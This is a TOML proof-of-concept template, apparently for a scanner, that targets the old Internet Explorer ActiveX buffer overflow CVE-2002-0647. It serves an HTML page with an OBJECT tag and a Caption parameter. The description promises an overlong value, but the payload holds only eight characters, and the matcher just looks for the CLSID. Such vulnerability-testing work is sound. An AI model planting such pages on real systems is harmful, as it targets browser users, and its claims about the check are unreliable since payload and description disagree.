[info]
author = "ave"
description = "通过构造包含恶意ActiveX控件的HTML页面，验证Microsoft Internet Explorer 5.01/5.5/6.0遗留文本格式ActiveX控件缓冲区溢出漏洞。使用CLSID 99B42120-6EC7-11CF-A6C7-00AA00A47DD2，通过超长Caption参数触发溢出。"
id = "POC-AVE-2002-0366"
name = "CVE-2002-0647 PoC"
severity = "high"
tags = ["cve-2002-0647"]
vuln_id = [
    "CVE-2002-0647",
    "AVE-2002-0366",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cve-2002-0647.html"
protocol = "http"

[poc.requests.body]
content = '<html><body><OBJECT classid="clsid:99B42120-6EC7-11CF-A6C7-00AA00A47DD2" id=lblActiveLbl width=250 height=250><PARAM NAME="Caption" VALUE="AAAAAAAA"></OBJECT></body></html>'
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["99B42120-6EC7-11CF-A6C7-00AA00A47DD2"]
